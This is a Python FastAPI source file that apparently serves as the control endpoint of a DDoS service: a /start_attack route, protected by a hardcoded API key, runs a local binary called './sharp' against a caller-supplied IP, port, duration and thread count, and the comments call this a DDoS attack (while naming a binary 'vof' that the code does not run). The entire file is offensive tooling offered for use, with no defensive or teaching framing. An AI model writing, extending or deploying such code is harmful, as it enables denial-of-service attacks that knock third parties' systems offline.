from fastapi import FastAPI, HTTPException
import os
import subprocess

# Set up the FastAPI application
app = FastAPI()

# Secret API key for authentication
SECRET_API_KEY = "blury"

@app.get("/start_attack")
async def start_attack(ip: str, port: int, duration: int, threads: int, api_key: str):
    # Check if the provided API key is valid
    if api_key != SECRET_API_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized")

    # Print the parameters (for logging purposes)
    print(f"Starting attack on {ip}:{port} for {duration} seconds with {threads} threads.")

    # Call your binary 'vof' to start the DDoS attack (make sure 'vof' is executable on the server)
    try:
        # Execute the command to start the attack
        # This assumes your binary 'vof' is in the same directory
        result = subprocess.run(
            ['./sharp', ip, str(port), str(duration), str(threads)],
            check=True,
            capture_output=True,
            text=True
        )
        
        # Log output from the command (optional)
        print(result.stdout)
        
        # Return success message
        return {"message": f"Attack started on {ip}:{port} for {duration} seconds with {threads} threads."}

    except subprocess.CalledProcessError as e:
        # If the attack command fails
        print(f"Error starting attack: {e.stderr}")
        raise HTTPException(status_code=500, detail="Failed to start attack")
    except Exception as e:
        # Catch any other exceptions
        print(f"Unexpected error: {str(e)}")
        raise HTTPException(status_code=500, detail="Unexpected error occurred")


# To run the FastAPI app, use the command:
# uvicorn <script_name>:app --host 0.0.0.0 --port 8000
